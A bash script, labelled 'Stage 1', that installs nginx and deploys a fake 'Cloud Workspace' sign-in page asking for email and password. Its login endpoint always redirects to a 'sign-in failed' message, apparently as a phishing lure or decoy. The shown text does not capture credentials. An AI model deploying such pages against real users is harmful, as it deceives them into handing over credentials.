#!/usr/bin/env bash

# ============================
# Stage 1: Fake Cloud Workspace page + Nginx
# ============================

# Colors
GRN="\e[32m"
RED="\e[31m"
YEL="\e[33m"
NC="\e[0m"

log_info()  { echo -e "${GRN}[INFO]${NC} $*"; }
log_warn()  { echo -e "${YEL}[WARN]${NC} $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*"; }

# 1. Root check
if [[ "$EUID" -ne 0 ]]; then
  log_error "Run this script as root (sudo)."
  exit 1
fi

# 2. Domain argument
DOMAIN="$1"
if [[ -z "$DOMAIN" ]]; then
  log_error "Domain is not specified. Usage: $0 example.com"
  exit 1
fi

WEBROOT="/var/www/${DOMAIN}"
NGINX_CONF="/etc/nginx/sites-available/${DOMAIN}"

log_info "Domain: ${DOMAIN}"

# 3. Dependencies
NEEDED_PKGS=(nginx curl jq dnsutils)
TO_INSTALL=()

for pkg in "${NEEDED_PKGS[@]}"; do
  if ! dpkg -s "$pkg" >/dev/null 2>&1; then
    TO_INSTALL+=("$pkg")
  fi
done

if [[ ${#TO_INSTALL[@]} -gt 0 ]]; then
  log_info "Installing missing packages: ${TO_INSTALL[*]}"
  apt-get update -y >/dev/null 2>&1
  apt-get install -y "${TO_INSTALL[@]}" >/dev/null 2>&1 || {
    log_error "Failed to install required packages."
    exit 1
  }
else
  log_info "All required packages are already installed."
fi

# 4. Webroot
log_info "Creating webroot: ${WEBROOT}"
mkdir -p "${WEBROOT}"

# 5. HTML page (rewritten on each run)
INDEX_FILE="${WEBROOT}/index.html"
log_info "Generating fake Cloud Workspace page..."

cat > "${INDEX_FILE}" <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Cloud Workspace — Sign in</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0e1a2b;
      font-family: "Segoe UI", Roboto, sans-serif;
      color: #e5e7eb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      padding: 32px 28px;
      backdrop-filter: blur(12px);
      box-shadow: 0 0 40px rgba(0, 0, 0, 0.45);
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    .logo-circle {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: linear-gradient(135deg, #3b82f6, #06b6d4);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 28px;
      font-weight: 700;
      color: #0e1a2b;
      box-shadow: 0 0 20px rgba(59, 130, 246, 0.4);
    }

    h2 {
      text-align: center;
      margin-bottom: 8px;
      font-size: 22px;
      font-weight: 600;
    }

    p {
      text-align: center;
      margin-bottom: 24px;
      font-size: 13px;
      color: #9ca3af;
    }

    .error-box {
      display: none;
      background: #7f1d1d;
      color: #fca5a5;
      padding: 10px 14px;
      border-radius: 8px;
      margin-bottom: 16px;
      font-size: 13px;
    }

    .field {
      margin-bottom: 16px;
    }

    .field label {
      display: block;
      margin-bottom: 6px;
      font-size: 12px;
      color: #cbd5e1;
    }

    .field input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 10px;
      border: 1px solid #1f2937;
      background: #0b1624;
      color: #e5e7eb;
      font-size: 14px;
      outline: none;
      transition: 0.15s;
    }

    .field input:focus {
      border-color: #3b82f6;
      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.35);
    }

    .checkbox {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #9ca3af;
      font-size: 12px;
      margin-bottom: 18px;
    }

    .checkbox input {
      width: 14px;
      height: 14px;
      accent-color: #3b82f6;
    }

    button {
      width: 100%;
      padding: 10px 12px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, #3b82f6, #06b6d4);
      color: #0e1a2b;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 10px 30px rgba(59, 130, 246, 0.35);
    }

    button:hover {
      filter: brightness(1.05);
    }

    button:active {
      transform: translateY(1px);
      box-shadow: 0 6px 20px rgba(59, 130, 246, 0.3);
    }

    .footer {
      margin-top: 18px;
      text-align: center;
      font-size: 11px;
      color: #64748b;
    }
  </style>
</head>

<body>
  <div class="container">

    <div class="logo">
      <div class="logo-circle">C</div>
    </div>

    <h2>Sign in to Cloud Workspace</h2>
    <p>Access your files, shared folders and workspace tools.</p>

    <!-- ERROR BOX -->
    <div id="auth-error" class="error-box">
      Sign‑in failed. Please check your credentials.
    </div>

    <!-- REAL POST -->
    <form method="POST" action="/login">
      <div class="field">
        <label for="email">Email</label>
        <input id="email" name="email" type="email" placeholder="name@company.com" required>
      </div>

      <div class="field">
        <label for="password">Password</label>
        <input id="password" name="password" type="password" placeholder="••••••••" required>
      </div>

      <label class="checkbox">
        <input type="checkbox" checked>
        <span>Remember me</span>
      </label>

      <button type="submit">Sign in</button>
    </form>

    <div class="footer">
      © Cloud Workspace — secure file platform
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    if (params.get("auth") === "failed") {
      const box = document.getElementById("auth-error");
      if (box) box.style.display = "block";
    }
  </script>

</body>
</html>
EOF

# 6. Nginx config (rewritten on each run)
log_info "Generating Nginx config: ${NGINX_CONF}"

cat > "${NGINX_CONF}" <<EOF
server {
    listen 80;
    server_name ${DOMAIN};

    root ${WEBROOT};
    index index.html;

    access_log /var/log/nginx/${DOMAIN}_access.log;
    error_log  /var/log/nginx/${DOMAIN}_error.log;

    location / {
        try_files \$uri \$uri/ =404;
    }

    # Realistic login endpoint: POST /login -> 302 /?auth=failed
    location /login {
        return 302 /?auth=failed;
    }
}
EOF

# 7. Enable site
ln -sf "${NGINX_CONF}" "/etc/nginx/sites-enabled/${DOMAIN}"

# Disable default site
if [[ -e /etc/nginx/sites-enabled/default ]]; then
  log_warn "Disabling default Nginx site"
  rm -f /etc/nginx/sites-enabled/default
fi

# 8. Test and restart Nginx
log_info "Testing Nginx configuration..."
if ! nginx -t; then
  log_error "nginx -t failed. Check the config."
  exit 1
fi

log_info "Restarting Nginx..."
systemctl enable nginx >/dev/null 2>&1
systemctl restart nginx

log_info "Done. Open in browser: http://${DOMAIN}"
